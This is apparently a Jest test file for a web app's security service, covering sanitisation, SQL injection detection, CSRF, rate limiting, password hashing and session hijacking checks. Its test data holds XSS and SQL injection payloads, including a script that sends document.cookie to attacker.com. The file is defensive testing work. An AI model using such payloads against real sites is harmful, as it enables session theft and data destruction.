import axios from 'axios';
import { SecurityService } from '../security.service';

// Mock axios to prevent actual API calls
jest.mock('axios');
const mockedAxios = axios as jest.Mocked<typeof axios>;

describe('Security and Intrusion Prevention', () => {
  let securityService: SecurityService;

  beforeEach(() => {
    jest.clearAllMocks();
    securityService = new SecurityService();
    // Mock the axios response for all tests
    mockedAxios.post.mockResolvedValue({ data: { success: true } });
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate and sanitize user input', () => {
      // Dangerous input with script tags
      const maliciousInput = '<script>alert("XSS");</script>User data';
      const sanitizedInput = securityService.sanitizeInput(maliciousInput);
      
      // Should strip script tags or encode them
      expect(sanitizedInput).not.toContain('<script>');
      expect(sanitizedInput).not.toContain('</script>');
    });

    it('should validate email addresses', () => {
      expect(securityService.validateEmail('test@example.com')).toBe(true);
      expect(securityService.validateEmail('invalid-email')).toBe(false);
      expect(securityService.validateEmail('admin@nestgate.io')).toBe(true);
      expect(securityService.validateEmail('<script>alert("XSS")</script>@example.com')).toBe(false);
    });

    it('should validate password strength', () => {
      // Weak password
      expect(securityService.validatePasswordStrength('password123')).toBe(false);
      
      // Strong password
      expect(securityService.validatePasswordStrength('P@ssw0rd!2023')).toBe(true);
      
      // SQL injection attempt
      expect(securityService.validatePasswordStrength("' OR '1'='1")).toBe(false);
    });
  });

  describe('XSS Protection', () => {
    it('should prevent stored XSS attacks', () => {
      const maliciousData = {
        name: '<img src="x" onerror="alert(\'XSS\')">',
        description: '<script>document.location="http://attacker.com/cookie?" + document.cookie</script>'
      };
      
      const sanitizedData = securityService.preventXSS(maliciousData);
      
      expect(sanitizedData.name).not.toContain('onerror');
      expect(sanitizedData.description).not.toContain('<script>');
    });

    it('should encode HTML entities in user-generated content', () => {
      const content = '<div>User content with <script>alert("XSS")</script></div>';
      const encodedContent = securityService.encodeHtmlEntities(content);
      
      expect(encodedContent).not.toContain('<script>');
      expect(encodedContent).toContain('&lt;');
      expect(encodedContent).toContain('&gt;');
    });
  });

  describe('SQL Injection Protection', () => {
    it('should detect and prevent SQL injection attempts', () => {
      // Classic SQL injection attempts
      expect(securityService.detectSqlInjection("' OR '1'='1")).toBe(true);
      expect(securityService.detectSqlInjection('DROP TABLE users;')).toBe(true);
      expect(securityService.detectSqlInjection('1; DELETE FROM users')).toBe(true);
      
      // Valid inputs
      expect(securityService.detectSqlInjection('Regular user input')).toBe(false);
      expect(securityService.detectSqlInjection('John Doe')).toBe(false);
    });

    it('should parameterize SQL queries', () => {
      const userId = '1 OR 1=1';
      const query = securityService.buildSafeQuery('getUserById', { id: userId });
      
      // Should use parameters/placeholders rather than string concatenation
      expect(query).not.toContain('1 OR 1=1');
      expect(query).toContain('?');
    });
  });

  describe('CSRF Protection', () => {
    it('should generate and validate CSRF tokens', () => {
      // Generate a token
      const token = securityService.generateCsrfToken();
      expect(token).toBeTruthy();
      expect(typeof token).toBe('string');
      expect(token.length).toBeGreaterThan(16); // Should be reasonably long
      
      // Validate the token
      expect(securityService.validateCsrfToken(token)).toBe(true);
      expect(securityService.validateCsrfToken('invalid-token')).toBe(false);
    });

    it('should require CSRF tokens for state-changing operations', async () => {
      // Mock a state-changing operation with valid token
      const validToken = securityService.generateCsrfToken();
      await securityService.performStateChangingOperation('update', { data: 'test' }, validToken);
      
      // Should have passed the token in the request
      expect(mockedAxios.post).toHaveBeenCalledWith(
        expect.any(String),
        expect.objectContaining({
          data: 'test',
          _csrf: validToken
        })
      );

      // Reset mock
      jest.clearAllMocks();

      // Should throw when no token is provided
      await expect(
        securityService.performStateChangingOperation('update', { data: 'test' }, '')
      ).rejects.toThrow('CSRF token validation failed');
      
      // Should not have made the API call
      expect(mockedAxios.post).not.toHaveBeenCalled();
    });
  });

  describe('Rate Limiting and Brute Force Protection', () => {
    it('should track login attempts and implement rate limiting', () => {
      // Simulate multiple login attempts
      for (let i = 0; i < 5; i++) {
        securityService.trackLoginAttempt('testuser', false);
      }
      
      // Should be locked out after too many attempts
      expect(securityService.isAccountLocked('testuser')).toBe(true);
      
      // Successful login should reset the counter
      securityService.trackLoginAttempt('testuser', true);
      expect(securityService.isAccountLocked('testuser')).toBe(false);
    });
    
    it('should implement progressive delays for failed attempts', () => {
      // First attempt
      const delay1 = securityService.getLoginDelayMs('user1', 1);
      
      // Third attempt
      const delay3 = securityService.getLoginDelayMs('user1', 3);
      
      // Fifth attempt
      const delay5 = securityService.getLoginDelayMs('user1', 5);
      
      // Delays should increase
      expect(delay3).toBeGreaterThan(delay1);
      expect(delay5).toBeGreaterThan(delay3);
    });
  });

  describe('Authentication Security', () => {
    it('should securely hash passwords', () => {
      const password = 'secure_password123';
      const hashedPassword = securityService.hashPassword(password);
      
      // Hash should be different from original password
      expect(hashedPassword).not.toBe(password);
      
      // Hash should be reasonably long (bcrypt/argon2 hashes are long)
      expect(hashedPassword.length).toBeGreaterThan(20);
      
      // Verification should work
      expect(securityService.verifyPassword(password, hashedPassword)).toBe(true);
      expect(securityService.verifyPassword('wrong_password', hashedPassword)).toBe(false);
    });
    
    it('should detect common passwords', () => {
      // Common/weak passwords
      expect(securityService.isCommonPassword('password')).toBe(true);
      expect(securityService.isCommonPassword('123456')).toBe(true);
      expect(securityService.isCommonPassword('qwerty')).toBe(true);
      
      // Stronger, less common passwords
      expect(securityService.isCommonPassword('j8K3$pL2@qF7')).toBe(false);
    });
  });

  describe('Session Security', () => {
    it('should generate and validate session tokens', () => {
      const sessionToken = securityService.generateSessionToken('user123');
      expect(sessionToken).toBeTruthy();
      
      // Validate session token
      const validation = securityService.validateSessionToken(sessionToken);
      expect(validation.valid).toBe(true);
      expect(validation.userId).toBe('user123');
      
      // Invalid token
      expect(securityService.validateSessionToken('invalid-token').valid).toBe(false);
    });
    
    it('should detect session hijacking attempts', () => {
      // Create session with specific IP and user agent
      const sessionId = securityService.createSession('user1', '192.168.1.1', 'Chrome/98.0');
      
      // Same IP and user agent (no hijacking)
      expect(securityService.detectSessionHijacking(sessionId, '192.168.1.1', 'Chrome/98.0')).toBe(false);
      
      // Different IP (potential hijacking)
      expect(securityService.detectSessionHijacking(sessionId, '10.0.0.1', 'Chrome/98.0')).toBe(true);
      
      // Different user agent (potential hijacking)
      expect(securityService.detectSessionHijacking(sessionId, '192.168.1.1', 'Firefox/95.0')).toBe(true);
    });
  });
}); 